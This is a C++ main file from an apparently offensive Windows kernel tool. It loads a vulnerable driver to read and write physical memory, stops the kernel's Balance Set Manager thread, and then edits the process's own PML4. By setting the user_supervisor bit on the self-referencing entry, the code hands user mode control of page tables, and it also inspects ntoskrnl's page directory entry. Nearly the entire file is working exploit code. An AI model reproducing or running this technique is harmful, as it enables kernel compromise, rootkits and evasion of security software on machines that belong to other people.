#include "ptm_ctx/ptm_ctx.hpp"
#include "set_mgr/set_mgr.hpp"

int __cdecl main(int argc, char** argv)
{
	const auto [drv_handle, drv_key] = vdm::load_drv();
	if (!drv_handle || drv_key.empty())
	{
		std::printf("[!] unable to load vulnerable driver...\n");
		return -1;
	}

	vdm::read_phys_t _read_phys = 
		[&](void* addr, void* buffer, std::size_t size) -> bool
	{
		return vdm::read_phys(addr, buffer, size);
	};

	vdm::write_phys_t _write_phys =
		[&](void* addr, void* buffer, std::size_t size) -> bool
	{
		return vdm::write_phys(addr, buffer, size);
	};

	vdm::vdm_ctx vdm(_read_phys, _write_phys);
	ptm::ptm_ctx my_proc(&vdm);

	const auto set_mgr_pethread = 
		set_mgr::get_setmgr_pethread(vdm);

	const auto result = 
		set_mgr::stop_setmgr(vdm, set_mgr_pethread);

	std::printf("[+] stop set mgr thread result -> 0x%x (0 == STATUS_SUCCESS)\n", result);
	if (!vdm::unload_drv(drv_handle, drv_key))
	{
		std::printf("[!] unable to unload vulnerable driver...\n");
		return -1;
	}

	_read_phys = 
		[&](void* addr, void* buffer, std::size_t size) -> bool
	{
		return my_proc.read_phys(buffer, addr, size);
	};

	_write_phys =
		[&](void* addr, void* buffer, std::size_t size) -> bool
	{
		return my_proc.write_phys(buffer, addr, size);
	};

	std::printf("[+] sleeping 30 seconds...\n");
	Sleep(30000);

	// abuse test, make a vdm using a mem_ctx...
	vdm = vdm::vdm_ctx(_read_phys, _write_phys);
	const auto current_pml4 =
		reinterpret_cast<ppml4e>(
			my_proc.set_page(my_proc.dirbase));

	for (auto idx = 0u; idx < 512; ++idx)
	{
		if (current_pml4[idx].present)
		{
			std::printf("pml4e at -> 0x%d (0x%p)\n", idx, 
				reinterpret_cast<std::uintptr_t>(my_proc.dirbase) + idx * sizeof pml4e);

			std::printf("	- pfn: 0x%x\n", current_pml4[idx].pfn);
			std::printf("	- writeable: %d\n", current_pml4[idx].writeable);
			std::printf("	- executable: %d\n", !current_pml4[idx].nx);

			if (current_pml4[idx].pfn == reinterpret_cast<std::uintptr_t>(my_proc.dirbase) >> 12)
			{
				std::printf("	[!]<- self referencing pml4e found at index: %d ->[!]\n", idx);
				current_pml4[idx].user_supervisor = true; // you can manage your own paging tables now :^)
			}
		}
	}

	const auto ntoskrnl_base =
		reinterpret_cast<void*>(
			util::get_kmodule_base("ntoskrnl.exe"));

	const auto ntoskrnl_pde = 
		my_proc.get_pde(ntoskrnl_base);

	std::printf("[+] pde.present -> %d\n", ntoskrnl_pde.second.present);
	std::printf("[+] pde.pfn -> 0x%x\n", ntoskrnl_pde.second.pfn);
	std::printf("[+] pde.large_page -> %d\n", ntoskrnl_pde.second.large_page);
	std::printf("[+] press any key to close...\n");
	std::getchar();
}